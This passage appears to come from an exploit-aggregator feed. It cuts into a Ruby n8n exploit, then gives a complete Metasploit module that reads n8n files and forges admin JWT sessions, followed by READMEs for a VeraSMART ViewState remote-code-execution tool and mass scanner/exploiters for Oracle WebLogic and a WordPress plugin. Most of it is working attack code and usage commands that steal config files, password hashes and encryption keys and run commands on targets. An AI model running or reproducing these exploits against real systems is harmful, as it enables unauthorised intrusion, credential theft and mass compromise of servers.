    \n        begin\n    \n          print_status(\"Step 1: Stealing configuration file...\")\n          config_path = \"#{datastore['HOME_DIR']}/.n8n/config\"\n          config_data = read_file_via_form(config_path)\n          \n          unless config_data\n            print_error(\"Failed to read config file. Target may not be vulnerable or path is incorrect.\")\n            return\n          end\n    \n          print_status(\"Step 2: Extracting encryption key...\")\n          secret = extract_encryption_key(config_data)\n          unless secret\n            print_error(\"Failed to extract encryption key\")\n            return\n          end\n    \n          print_status(\"Step 3: Stealing database file...\")\n          db_path = \"#{datastore['HOME_DIR']}/.n8n/database.sqlite\"\n          db_data = read_file_via_form(db_path)\n          \n          unless db_data\n            print_error(\"Failed to read database file\")\n            return\n          end\n    \n          print_status(\"Step 4: Extracting admin credentials...\")\n          admin_data = extract_admin_data_sqlite(db_data)\n          \n          unless admin_data\n            print_error(\"Failed to extract admin data using SQLite parser\")\n            print_error(\"Database may be corrupted or from different n8n version\")\n            return\n          end\n          \n          print_good(\"Successfully extracted admin credentials for: #{admin_data['admin_email']}\")\n    \n          print_status(\"Step 5: Creating authentication token...\")\n          token = create_session_token(secret, admin_data['admin_id'], admin_data['admin_hash'])\n          \n          unless token\n            print_error(\"Failed to create authentication token\")\n            return\n          end\n    \n          print_status(\"Step 6: Preparing payload...\")\n          command = generate_compatible_payload\n          \n          unless command\n            print_error(\"Failed to generate payload\")\n            return\n          end\n    \n          print_status(\"Step 7: Creating malicious workflow...\")\n          workflow_info = create_workflow(token, command)\n          \n          unless workflow_info\n            print_error(\"Failed to create workflow\")\n            return\n          end\n          \n          created_workflows << workflow_info['id']\n    \n          print_status(\"Step 8: Executing payload...\")\n          output, error = execute_workflow(token, workflow_info)\n          \n          if error\n            print_warning(\"Execution completed with warning: #{error}\")\n          end\n          \n          if output && output != \"No output captured\"\n            print_good(\"Command executed successfully!\")\n            print_line(\"\\n#{output}\\n\")\n          else\n            print_warning(\"No output captured, but payload may have executed\")\n          end\n    \n          print_status(\"Step 9: Saving loot...\")\n          \n          loot_path = store_loot(\n            'n8n.config',\n            'text/plain',\n            rhost,\n            config_data,\n            'n8n_config.txt',\n            'n8n Configuration File'\n          )\n          print_good(\"Saved config to: #{loot_path}\")\n          \n          loot_path = store_loot(\n            'n8n.database',\n            'application/x-sqlite3',\n            rhost,\n            db_data,\n            'n8n_database.sqlite',\n            'n8n SQLite Database'\n          )\n          print_good(\"Saved database to: #{loot_path}\")\n          \n          print_good(\"Exploitation completed!\")\n          \n        rescue => e\n          print_error(\"Unexpected error during exploitation: #{e.message}\")\n          if datastore['VERBOSE']\n            print_error(\"Backtrace: #{e.backtrace.join(\"\\n\")}\")\n          end\n        ensure\n    \n          if token && created_workflows.any?\n            cleanup_workflows(token, created_workflows)\n          elsif created_workflows.any?\n            print_warning(\"Cannot clean up workflows without authentication token\")\n          end\n        end\n      end\n    end\n    \t\n    Greetings to :======================================================================\n    jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|\n    ====================================================================================",
            "language": "bash"
        },
        {
            "title": "n8n arbitrary file read",
            "score": 10.0,
            "href": "https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/ni8mare_cve_2026_21858.rb",
            "type": "metasploit",
            "published": "2026-02-16",
            "id": "MSF:AUXILIARY-GATHER-NI8MARE_CVE_2026_21858-",
            "source": "## https://sploitus.com/exploit?id=MSF:AUXILIARY-GATHER-NI8MARE_CVE_2026_21858-\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'sqlite3'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'n8n arbitrary file read',\n        'Description' => 'This module exploits CVE-2026-21858, a critical unauthenticated remote code execution vulnerability in n8n workflow automation platform versions 1.65.0 through 1.120.x. The vulnerability, dubbed \"Ni8mare\", is a content-type confusion flaw in webhook request handling that allows attackers to achieve arbitrary file read.',\n        'Author' => [\n          'dor attias', # research\n          'msutovsky-r7' # module\n        ],\n        'Actions' => [\n          ['READ_FILE', { 'Description' => 'Read an arbitrary file from the target' }],\n          ['EXTRACT_SESSION', { 'Description' => 'Create an admin JWT session key by reading out secrets' }]\n        ],\n        'DefaultAction' => 'EXTRACT_SESSION',\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGET_EMAIL', [false, 'A target user for spoofed session, when EXTRACT_ADMIN_SESSION action is set'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),\n      OptString.new('N8N_CONFIG_DIR', [false, 'Absolute path to n8n config directory', '/home/node/.n8n/'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),\n      OptString.new('TARGET_FILENAME', [false, 'A target filename, when READ_FILE action is set'], conditions: ['ACTION', '==', 'READ_FILE']),\n      OptString.new('USERNAME', [true, 'Username of n8n (email address)']),\n      OptString.new('PASSWORD', [true, 'Password of n8n'])\n    ])\n  end\n\n  def content_type_confusion_upload(form_uri, filename)\n    extraction_filename = \"#{Rex::Text.rand_text_alpha(rand(8..11))}.pdf\"\n    json_data = {\n      files: {\n        \"field-0\":\n        {\n          filepath: filename,\n          originalFilename: extraction_filename,\n          mimeType: 'text/plain',\n          extenstion: ''\n        }\n      },\n      data: [\n        Rex::Text.rand_text_alpha(12)\n      ],\n      executionId: Rex::Text.rand_text_alpha(12)\n    }\n    res = send_request_cgi({\n      'uri' => normalize_uri('form-test', form_uri),\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => json_data.to_json\n    })\n\n    fail_with(Failure::UnexpectedReply, 'Received unexpected response') unless res&.code == 200\n\n    json_res = res.get_json_document\n\n    fail_with(Failure::PayloadFailed, 'Failed to load target file') unless json_res['status'] != '200'\n  end\n\n  def login\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'rest', 'login'),\n      'ctype' => 'application/json',\n      'keep_cookies' => true,\n      'data' => {\n        'emailOrLdapLoginId' => datastore['USERNAME'],\n        'email' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }.to_json\n    )\n    return false unless res\n    return true if res&.code == 200\n\n    json_data = res.get_json_document\n\n    print_error(\"Login failed: #{json_data['message']}\")\n\n    false\n  end\n\n  def create_file_upload_workflow\n    @workflow_name = \"workflow_#{Rex::Text.rand_text_alphanumeric(8)}\"\n    random_uuid = SecureRandom.uuid.strip\n    workflow_data = {\n      'name' => @workflow_name,\n      'active' => false,\n      'settings' => {\n        'saveDataErrorExecution' => 'all',\n        'saveDataSuccessExecution' => 'all',\n        'saveManualExecutions' => true,\n        'executionOrder' => 'v1'\n      },\n      nodes: [\n        {\n          parameters: {\n            formTitle: Rex::Text.rand_text_alphanumeric(8),\n            formFields: {\n              values: [\n                {\n                  fieldLabel: Rex::Text.rand_text_alphanumeric(8),\n                  fieldType: 'file'\n                }\n              ]\n            },\n            options: {}\n          },\n          type: 'n8n-nodes-base.formTrigger',\n          typeVersion: 2.3,\n          position: [0, 0],\n          id: 'e4f12efa-9975-4041-b71f-0ce4999ec5a7',\n          name: 'On form submission',\n          webhookId: random_uuid\n        }\n      ],\n      'connections' => {},\n      settings: { executionOrder: 'v1' }\n    }\n\n    print_status('Creating file upload workflow...')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows'),\n      'ctype' => 'application/json',\n      'keep_cookies' => true,\n      'data' => workflow_data.to_json\n    )\n    fail_with(Failure::UnexpectedReply, \"Failed to create workflow: #{res&.code}\") unless res&.code == 200 || res.code == 201\n\n    json = res.get_json_document\n\n    @workflow_id = json.dig('data', 'id') || json['id']\n    nodes = json.dig('data', 'nodes')\n    version_id = json.dig('data', 'versionId')\n    id = json.dig('data', 'id')\n\n    fail_with(Failure::NotFound, 'Failed to get workflow ID from response') unless @workflow_id && nodes && version_id && id\n\n    activation_data = {\n      'workflowData' => {\n        'name' => @workflow_name,\n        'nodes' => nodes,\n        'pinData' => {},\n        'connections' => {},\n        'active' => false,\n        'settings' => {\n          'saveDataErrorExecution' => 'all',\n          'saveDataSuccessExecution' => 'all',\n          'saveManualExecutions' => true,\n          'executionOrder' => 'v1'\n        },\n        'tags' => [],\n        'versionId' => version_id,\n        'meta' => 'null',\n        'id' => id\n      },\n      startNodes: [\n        {\n          name: 'On form submission',\n          sourceData: 'null'\n        }\n      ],\n      destinationNode: 'On form submission'\n    }\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s, 'run'),\n      'ctype' => 'application/json',\n      'keep_cookies' => true,\n      'data' => activation_data.to_json\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Workflow may not run, received unexpected reply') unless res&.code == 200\n\n    json_data = res.get_json_document\n\n    fail_with(Failure::PayloadFailed, 'Failed to run workflow') unless json_data.dig('data', 'waitingForWebhook') == true\n    random_uuid\n  end\n\n  def get_run_id\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('rest', 'executions'),\n      'vars_get' =>\n      {\n        'filter' => %({\"workflowId\":\"#{@workflow_id}\"}),\n        'limit' => 10\n      }\n    })\n    fail_with(Failure::UnexpectedReply, 'Received unexpected reply, could not get run ID') unless res&.code == 200\n\n    json_data = res.get_json_document\n\n    run_id = json_data.dig('data', 'results', 0, 'id')\n    fail_with(Failure::Unknown, 'Failed to get run ID, workflow might not run') unless run_id\n\n    run_id\n  end\n\n  def archive_workflow\n    print_status(\"Cleaning up workflow #{@workflow_id}...\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s, 'archive'),\n      'keep_cookies' => true\n    )\n\n    return false unless res&.code == 200\n\n    json_data = res.get_json_document\n\n    return false unless json_data.dig('data', 'id') == @workflow_id\n\n    true\n  end\n\n  def valid_username?(username)\n    /\\A[\\w+\\-.]+@[a-z\\d-]+(\\.[a-z\\d-]+)*\\.[a-z]+\\z/i =~ username\n  end\n\n  def delete_workflow\n    res = send_request_cgi(\n      'method' => 'DELETE',\n      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s)\n    )\n\n    return false unless res&.code == 200\n\n    json_data = res.get_json_document\n\n    return false unless json_data['data'] == true\n\n    true\n  end\n\n  def extract_content(run_id)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('rest', 'executions', run_id)\n    })\n\n    fail_with(Failure::UnexpectedReply, 'Failed to get information about execution, received unexpected reply') unless res&.code == 200\n\n    json_data = res.get_json_document\n\n    file_data = json_data.dig('data', 'data')\n\n    fail_with(Failure::PayloadFailed, 'Failed to read the file') unless file_data\n\n    parsed_file_data = parse_json_data(file_data)\n\n    file_content_enc = parsed_file_data[29]\n\n    fail_with(Failure::NotFound, 'File not found') unless file_content_enc\n\n    file_content = ::Base64.decode64(file_content_enc)\n\n    file_content\n  end\n\n  def parse_json_data(data)\n    begin\n      parsed_file_data = JSON.parse(data)\n    rescue JSON::ParserError\n      fail_with(Failure::Unknown, 'Failed to parse JSON data')\n    end\n    parsed_file_data\n  end\n\n  def read_file(filename)\n    form_uri = create_file_upload_workflow\n\n    content_type_confusion_upload(form_uri, filename)\n\n    run_id = get_run_id\n\n    file_content = extract_content(run_id)\n\n    if !archive_workflow\n      print_warning('Could not archive workflow, workflow might need to be archived and deleted manually')\n      return file_content\n    end\n\n    if !delete_workflow\n      print_warning('Could not deleted workflow, workflow might need to be deleted manually')\n      return file_content\n    end\n\n    file_content\n  end\n\n  def run\n    fail_with(Failure::BadConfig, 'Username should be valid email') unless valid_username?(datastore['USERNAME'])\n    fail_with(Failure::NoAccess, 'Failed to login') unless login\n\n    case action.name\n    when 'READ_FILE'\n      target_filename = datastore['TARGET_FILENAME']\n      fail_with(Failure::BadConfig, 'Filename needs to be set') if target_filename.blank?\n      file_content = read_file(target_filename)\n\n      stored_path = store_loot(target_filename, 'text/plain', datastore['rhosts'], file_content)\n      print_good(\"Results saved to: #{stored_path}\")\n\n    when 'EXTRACT_SESSION'\n      target_email = datastore['TARGET_EMAIL']\n\n      fail_with(Failure::BadConfig, 'Target email needs to be set') if target_email.blank?\n      fail_with(Failure::BadConfig, 'Target email should be valid email') unless valid_username?(target_email)\n\n      db_content = read_file(\"#{datastore['N8N_CONFIG_DIR']}/database.sqlite\")\n\n      fail_with(Failure::NotFound, 'Could not found database file') unless db_content\n\n      db_loot_name = store_loot('database.sqlite', 'application/x-sqlite3', datastore['rhosts'], db_content)\n\n      print_good(\"Database saved to: #{db_loot_name}\")\n\n      db = SQLite3::Database.new(db_loot_name)\n\n      user_id = db.execute(%(select id from user where email='#{target_email}')).dig(0, 0)\n      password_hash = db.execute(%(select password from user where email='#{target_email}')).dig(0, 0)\n\n      fail_with(Failure::NotFound, \"Could not found #{target_email} in database\") unless user_id && password_hash\n\n      print_good(\"Extracted user ID: #{user_id}\")\n      print_good(\"Extracted password hash: #{password_hash}\")\n\n      store_valid_credential(\n        user: target_email,\n        private: password_hash\n      )\n\n      config_content = read_file(\"#{datastore['N8N_CONFIG_DIR']}/config\")\n\n      fail_with(Failure::NotFound, 'Could not found config file') unless config_content\n\n      config_name = store_loot('n8n.config', 'plain/text', datastore['rhosts'], config_content)\n      print_good(\"Config file saved to: #{config_name}\")\n\n      config_content_json = parse_json_data(config_content)\n      encryption_key = config_content_json['encryptionKey']\n\n      print_good(\"Extracted encryption key: #{encryption_key}\")\n\n      encryption_key = (0...encryption_key.length).step(2).map { |i| encryption_key[i] }\n      encryption_key = encryption_key.join('')\n\n      jwt_payload = %({\"id\":\"#{user_id}\",\"hash\":\"#{Base64.urlsafe_encode64(Digest::SHA256.digest(\"#{target_email}:#{password_hash}\"))[0..9]}\"})\n\n      jwt_ticket = Msf::Exploit::Remote::HTTP::JWT.encode(jwt_payload.to_s, OpenSSL::Digest::SHA256.hexdigest(encryption_key))\n\n      print_good(\"JWT ticket as #{target_email}: #{jwt_ticket}\")\n\n    end\n  end\n\nend",
            "language": "RUBY"
        },
        {
            "title": "Exploit for CVE-2026-26335",
            "score": 10.0,
            "href": "https://github.com/mbanyamer/CVE-2026-26335-Calero-VeraSMART-RCE",
            "type": "githubexploit",
            "published": "2026-02-14",
            "id": "3873BA24-292D-55CB-9F36-921E576A8E90",
            "source": "## https://sploitus.com/exploit?id=3873BA24-292D-55CB-9F36-921E576A8E90\n## \ud83d\udc64 Author\n\n**Mohammed Idrees Banyamer**\nSecurity Researcher\n\n* GitHub: [https://github.com/mbanyamer](https://github.com/mbanyamer)\n* Instagram: [https://instagram.com/banyamer_security](https://instagram.com/banyamer_security)\n\n\n---\n\n# CVE-2026-26335 - Calero VeraSMART ViewState RCE Exploit\n\n![CVE](https://img.shields.io/badge/CVE-2026--26335-red)\n![Severity](https://img.shields.io/badge/Severity-Critical-ff0000)\n![CVSS](https://img.shields.io/badge/CVSS-9.8-critical)\n![Platform](https://img.shields.io/badge/Platform-Windows-blue)\n![ASP.NET](https://img.shields.io/badge/ASP.NET-ViewState-orange)\n![Python](https://img.shields.io/badge/Python-3.x-blue)\n![License](https://img.shields.io/badge/License-Educational-lightgrey)\n![Author](https://img.shields.io/badge/Author-Banyamer-black)\n\n---\n\n## \ud83d\udccc Description\n\n**CVE\u20112026\u201126335** is a critical unauthenticated remote code execution vulnerability in **Calero VeraSMART** (pre\u20112022 R1).\n\nThe application uses **static hard\u2011coded ASP.NET machine keys** shared across installations.  \nAn attacker with these keys can forge a malicious ASP.NET ViewState and trigger **server\u2011side deserialization \u2192 RCE**.\n\nThis exploit automates:\n\n- ViewState endpoint discovery\n- `__VIEWSTATEGENERATOR` extraction\n- ysoserial payload generation\n- Signed ViewState delivery\n- Command execution\n\n---\n\n## \u26a0\ufe0f Impact\n\n- Unauthenticated RCE\n- IIS user compromise\n- Domain lateral movement\n- Data exfiltration\n- Persistence via webshell\n\n---\n\n## \ud83e\udde0 Root Cause\n\n**CWE\u2011321 \u2014 Hard\u2011coded cryptographic keys**\n\nVeraSMART deployments reuse identical ASP.NET machineKey:\n\n```xml\n\n````\n\nAny attacker with keys from one installation can attack all.\n\n---\n\n## \ud83d\udee0 Requirements\n\n* Python 3\n* ysoserial.net\n* VeraSMART machine keys\n* Network access to IIS\n\n---\n\n## \u2699\ufe0f Installation\n\n```bash\ngit clone https://github.com/mbanyamer/CVE-2026-26335-VeraSMART-RCE.git\ncd CVE-2026-26335-VeraSMART-RCE\nwget https://github.com/pwntester/ysoserial.net/releases/latest/download/ysoserial.exe\n```\n\n---\n\n## \ud83d\udd11 Obtaining Machine Keys\n\nKeys are **not public**. Obtain from target:\n\n```bash\nC:\\Program Files (x86)\\Veramark\\VeraSMART\\WebRoot\\web.config\n```\n\nOr via companion file\u2011read:\n\n**CVE\u20112026\u201126333**\n\n---\n\n## \ud83d\ude80 Usage\n\n### Check vulnerability\n\n```bash\npython3 exploit.py -t https://target-ip -vk VALIDATION_KEY -dk DECRYPTION_KEY --check-only -v\n```\n\n### Execute command\n\n```bash\npython3 exploit.py -t https://target-ip -vk VALIDATION_KEY -dk DECRYPTION_KEY -c \"whoami\"\n```\n\n### Specific endpoint\n\n```bash\npython3 exploit.py -t https://target-ip -vk KEY -dk KEY -e /Login.aspx -c \"powershell -enc ZQBjAGgAbwAgAEgAYQBjAGsAZQBkAA==\"\n```\n\n### Proxy debugging\n\n```bash\npython3 exploit.py -t https://target-ip -vk KEY -dk KEY --proxy http://127.0.0.1:8080 -v\n```\n\n---\n\n## \ud83d\udce1 Exploitation Flow\n\n1. Find ViewState endpoint\n2. Extract generator\n3. Generate signed payload\n4. Send forged ViewState\n5. ASP.NET deserialization\n6. Command execution\n\n---\n\n## \ud83d\udcca CVSS\n\n**9.8 \u2014 Critical**\nAV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n\n---\n\n## \ud83e\uddea Tested On\n\n* VeraSMART 2020\n* VeraSMART 2021\n* VeraSMART 2022 (pre\u2011R1)\n* Windows Server 2016/2019\n* IIS 10\n* ASP.NET 4.x\n\n---\n\n## \ud83d\udd12 Mitigation\n\nFixed in VeraSMART 2022 R1:\n\n* Unique machine keys\n* ViewState hardening\n* Secure key storage\n\nWorkarounds:\n\n* Rotate machineKey\n* Disable ViewState\n* Restrict IIS exposure\n* WAF ViewState rules\n\n---\n\n## \ud83d\udcda References\n\n* [https://www.vulncheck.com/advisories/calero-verasmart-2022-r1-static-iis-machine-keys-enable-viewstate-rce](https://www.vulncheck.com/advisories/calero-verasmart-2022-r1-static-iis-machine-keys-enable-viewstate-rce)\n* [https://www.calero.com/](https://www.calero.com/)\n\n---\n\n## \u2696\ufe0f Disclaimer\n\nEducational and authorized testing only.\nUse only on systems you own or have permission to assess.\n\n---\n\n## \ud83d\udc64 Author\n\n**Mohammed Idrees Banyamer**\nSecurity Researcher\n\n* GitHub: [https://github.com/mbanyamer](https://github.com/mbanyamer)\n* Instagram: [https://instagram.com/banyamer_security](https://instagram.com/banyamer_security)\n\n---\n## \ud83d\udcca Exploit Diagram\n\nThe following diagram illustrates the exploitation chain of **CVE\u20112026\u201126335** in Calero VeraSMART, where static ASP.NET machine keys allow forging a malicious ViewState leading to remote code execution.\n\n```mermaid\nflowchart LR\n    A[Attacker] --> B[Obtain VeraSMART machineKey]\n    B --> C[Discover ViewState endpoint]\n    C --> D[Extract __VIEWSTATEGENERATOR]\n    D --> E[Generate malicious ViewState via ysoserial]\n    E --> F[Sign payload with machineKey]\n    F --> G[Send forged POST request]\n    G --> H[ASP.NET ViewState deserialization]\n    H --> I[TypeConfuseDelegate gadget]\n    I --> J[Remote Code Execution on IIS]",
            "language": "MARKDOWN"
        },
        {
            "title": "Exploit for Improper Input Validation in N8N",
            "score": 10.0,
            "href": "https://github.com/EQSTLab/CVE-2026-21858",
            "type": "githubexploit",
            "published": "2026-02-11",
            "id": "1C0B01AD-7D2F-5E47-AC19-3DAC92365632",
            "source": "## https://sploitus.com/exploit?id=1C0B01AD-7D2F-5E47-AC19-3DAC92365632\nNo description provided",
            "language": "MARKDOWN"
        },
        {
            "title": "Exploit for Improper Access Control in Oracle Http_Server",
            "score": 10.0,
            "href": "https://github.com/compfaculty/cve-2026-oracle",
            "type": "githubexploit",
            "published": "2026-02-10",
            "id": "0B1BDC40-069F-50E3-B974-77679CB4F5BA",
            "source": "## https://sploitus.com/exploit?id=0B1BDC40-069F-50E3-B974-77679CB4F5BA\n# CVE-2026-21962 Concurrent WebLogic Scanner/Exploiter\n\nHigh-performance Go application for scanning and exploiting CVE-2026-21962 (Oracle WebLogic Proxy Plug-in vulnerability) across multiple targets concurrently.\n\n## Features\n\n- **Concurrent Processing**: Worker pool pattern for high-throughput scanning\n- **GNMAP Parser**: Parses Masscan gnmap output files\n- **Multi-phase Exploitation**: \n  - Phase 1: Probe for vulnerable ProxyServlet endpoints\n  - Phase 2: Send malicious headers with Base64 payloads\n  - Phase 3: Analyze responses for vulnerability indicators\n- **Structured Output**: JSON or human-readable text format\n- **Progress Reporting**: Real-time progress updates\n- **Graceful Shutdown**: Handles interrupts cleanly\n\n## Project Structure\n\n```\ncve-2026-oracle/\n\u251c\u2500\u2500 cmd/\n\u2502   \u2514\u2500\u2500 scanner/\n\u2502       \u2514\u2500\u2500 main.go          # CLI entry point\n\u251c\u2500\u2500 internal/\n\u2502   \u251c\u2500\u2500 scanner/             # Scanning logic and worker pool\n\u2502   \u251c\u2500\u2500 exploit/             # Payload generation and exploit execution\n\u2502   \u251c\u2500\u2500 parser/              # GNMAP file parsing\n\u2502   \u251c\u2500\u2500 client/              # HTTP client wrapper\n\u2502   \u2514\u2500\u2500 types/               # Shared data structures\n\u251c\u2500\u2500 go.mod                   # Go module definition\n\u2514\u2500\u2500 README.md               # This file\n```\n\n## Build\n\n### Using Make (Recommended)\n\n```bash\n# Build the scanner binary\nmake build\n\n# Build optimized release binary\nmake build-release\n\n# Build for all platforms (Linux, Windows, macOS)\nmake build-all\n\n# Run development workflow (fmt, vet, test, build)\nmake dev\n\n# See all available targets\nmake help\n```\n\n### Using Go directly\n\n```bash\n# Build the scanner binary\ngo build -o scanner ./cmd/scanner\n\n# Or install globally\ngo install ./cmd/scanner@latest\n```\n\n## Usage\n\n```bash\n./scanner -file weblogic_ports.gnmap [options]\n```\n\n### Options\n\n- `-file `: Path to Masscan gnmap file (required)\n- `-workers `: Number of concurrent workers (default: 50, max: 500)\n- `-timeout `: Request timeout in seconds (default: 15)\n- `-insecure`: Skip SSL certificate verification\n- `-json`: Output results in JSON format\n- `-command `: Command to execute on vulnerable targets (default: \"id\")\n- `-exploit`: Attempt actual command execution on vulnerable targets (default: true)\n\n### Examples\n\n```bash\n# Basic scan with default settings\n./scanner -file weblogic_ports.gnmap\n\n# High-throughput scan with 100 workers\n./scanner -file weblogic_ports.gnmap -workers 100\n\n# JSON output for automation\n./scanner -file weblogic_ports.gnmap -json > results.json\n\n# Skip SSL verification for lab environments\n./scanner -file weblogic_ports.gnmap -insecure\n\n# Execute specific command on vulnerable targets\n./scanner -file weblogic_ports.gnmap -command \"uname -a\" -exploit\n\n# Windows command format\n./scanner -file weblogic_ports.gnmap -command \"cmd:whoami\" -exploit\n\n# Disable exploitation (scan only)\n./scanner -file weblogic_ports.gnmap -exploit=false\n```\n\n## GNMAP File Format\n\nThe scanner expects Masscan gnmap output format:\n```\nHost:  ()\tPorts: /open/tcp////\n```\n\nMultiple ports per host are supported (comma-separated).\n\n## Output\n\n### Text Mode (default)\n\n- Summary statistics (total, vulnerable, errors, duration)\n- Vulnerable targets with findings\n- Error details\n\n### JSON Mode (`-json`)\n\nStructured JSON output with:\n- Summary statistics\n- Complete results array with findings per target\n\n## Vulnerability Detection\n\nThe scanner identifies vulnerable targets by:\n\n1. **CRITICAL Findings**: Injected headers reflected in response\n2. **SUSPICIOUS Findings**: Oracle/WebLogic indicators in responses\n3. **Response Analysis**: Unusual status codes, error messages, content hashing\n\n## Performance\n\n- **Complexity**: O(n) where n = number of targets\n- **Concurrency**: Configurable worker pool (default 50 workers)\n- **Network**: Connection pooling and reuse for efficiency\n- **Timeouts**: Per-request timeout prevents hanging\n\n## Security Notes\n\n- **Authorized Use Only**: For authorized security research and testing\n- **SSL Verification**: Use `-insecure` only in isolated lab environments\n- **Rate Limiting**: Consider network capacity when setting worker count\n\n## Architecture\n\n- **cmd/scanner/main.go**: CLI interface and orchestration\n- **internal/parser/**: GNMAP file parsing\n- **internal/types/**: Data structures (Target, Result, Finding, ScanStats)\n- **internal/exploit/**: Payload generation and exploit logic\n- **internal/client/**: HTTP client wrapper with TLS configuration\n- **internal/scanner/**: Worker pool and concurrent scanning logic\n\n## Error Handling\n\n- Network errors \u2192 marked as error, scan continues\n- Timeouts \u2192 marked as timeout, scan continues\n- Invalid targets \u2192 skipped with warning\n- Panic recovery \u2192 logged, scan continues\n\n## License\n\nThis tool is for authorized security research and testing only. Use responsibly and in compliance with all applicable laws and policies.",
            "language": "MARKDOWN"
        },
        {
            "title": "Exploit for CVE-2026-23550",
            "score": 10.0,
            "href": "https://github.com/epsilonpoint88-glitch/EpSiLoNPoInT-",
            "type": "githubexploit",
            "published": "2026-02-10",
            "id": "37E2A7B0-C856-596C-B4ED-7455477B3D60",
            "source": "## https://sploitus.com/exploit?id=37E2A7B0-C856-596C-B4ED-7455477B3D60\n# EpSiLoNPoInT-\n\ud83d\udd34 EpSiLoNPoInT - CVE-2026-23550 Modular DS Zero-Click  **Framework d'exploitation Modular DS Admin Bypass**  ## \ud83c\udfaf CVE Cibl\u00e9e Principale **CVE-2026-23550** : Modular DS WordPress Plugin - 40 000+ sites affect\u00e9s  - Acc\u00e8s admin **z\u00e9ro-clic** non authentifi\u00e9 - `exploitmass.py` (48KB) - Exploit massif  ## Modules",
            "language": "MARKDOWN"
        },
        {
            "title": "Exploit for Improper Access Control in Oracle Http_Server",
            "score": 10.0,
            "href": "https://github.com/George0Papasotiriou/CVE-2026-21962-Oracle-HTTP-Server-WebLogic-Proxy-Plug-in-Critical-",
            "type": "githubexploit",
            "published": "2026-02-09",
            "id": "28798546-B5B4-5A1E-B153-9FC1A3E7CC48",
            "source": "## https://sploitus.com/exploit?id=28798546-B5B4-5A1E-B153-9FC1A3E7CC48\n# CVE-2026-21962-Oracle-HTTP-Server-WebLogic-Proxy-Plug-in-Critical-\nOracle Fusion Middleware Oracle HTTP Server / WebLogic Server Proxy Plug-in has an easily exploitable, unauthenticated, network-reachable flaw allowing compromise over HTTP. Affected supported versions include 12.2.1.4.0, 14.1.1.0.0, 14.1.2.0.0.\n\nCVSS 10.0 (per Oracle / NVD text) and remotely reachable over HTTP.\n\nThe check.py is used only for exposure checking and banner/version hinting only. \nFirst run requirements.txt -> check.py\n\nFor testing and research purposes, I have also included exploit.py it is meant to; \n1) Simulate the logic of the attack for analysis.\n2) Safely probe your environment for indicators of compromise (IOCs) or misconfiguration.\n3) Generate realistic payloads for your defensive sensor testing (WAF, IDS, custom detections).\n4) Educate on the exact request structures.\n\nExample output from exploit.py:\n\n[ATTACKER PERSPECTIVE] - Theoretical Kill Chain\n1.  RECON: Discovers an exposed Oracle HTTP Server (port 80/443).\n2.  FINGERPRINT: Uses your `check.py` or similar to confirm version in AFFECTED_TRAINS.\n3.  PROBE: Sends the ambiguous path request to locate `ProxyServlet`.\n4.  EXPLOIT CRAFTING: Injects malicious `wl-proxy-client-ip` header with `;Base64` payload.\n5.  REQUEST FORWARDING: The vulnerable plug-in improperly validates/parses the header.\n6.  ACCESS: Gains unauthorized access to the backend WebLogic server's data and functions.\n7.  PIVOT & PERSIST: Moves laterally within the Fusion Middleware environment.\n\n[DEFENDER PERSPECTIVE] - IMMEDIATE ACTIONS (BEYOND PATCHING)[citation:6][citation:8]\n*** PATCHING IS NON-NEGOTIABLE. APPLY ORACLE'S JANUARY 2026 CPU[citation:10]. ***",
            "language": "MARKDOWN"
        },
        {
            "title": "Exploit for CVE-2026-23550",
            "score": 10.0,
            "href": "https://github.com/dzmind2312/Mass-CVE-2026-23550-Exploit",
            "type": "githubexploit",
            "published": "2026-02-07",
            "id": "0674FE5F-3223-5C87-AD5E-92DBC8265D10",
            "source": "## https://sploitus.com/exploit?id=0674FE5F-3223-5C87-AD5E-92DBC8265D10\n\ud83d\udd25 CVE-2026-23550 Modular DS Scanner\n\n\nMulti-threaded Python scanner for CVE-2026-23550 (CVSS 10.0) WordPress Modular DS plugin \u22642.5.1 vulnerability affecting 40k+ sites. Detects unauthenticated admin takeover via getLogin() bypass with full wp-admin access verification.\nFeatures \u2728\n\n    \ud83d\udd25 Full admin access detection (cookies + wp-admin verification)\n\n    \u26a1 Multi-threading (up to 50+ concurrent targets)\n\n    \ud83d\udcca Animated progress bar with rich\n\n    \ud83c\udfa8 Colorized summary table\n\n    \ud83d\udcbe Auto-save vulnerable targets to file\n\n    \ud83d\ude80 Production-ready timeouts & error handling\n\nInstallation \ud83d\ude80\n\nbash\npip3 install requests rich\nchmod +x modular_ds.py\n\nUsage \ud83d\udccb\n\nbash\n# Mass scan (50 threads)\npython3 modular_ds.py -l targets.txt -t 50 -o bounty_vulns.txt\n\n# Bug bounty recon\npython3 modular_ds.py -l univ-oran1.txt -t 20\n\n# Default (20 threads, vulns.txt output)\npython3 modular_ds.py -l targets.txt\n\ntargets.txt format:\n\ntext\nhttps://target1.com\nhttp://site2.com\n# Skip comments  \nhttps://sub.domain.tld\n\nArguments\nFlag\tDescription\tDefault\n-l, 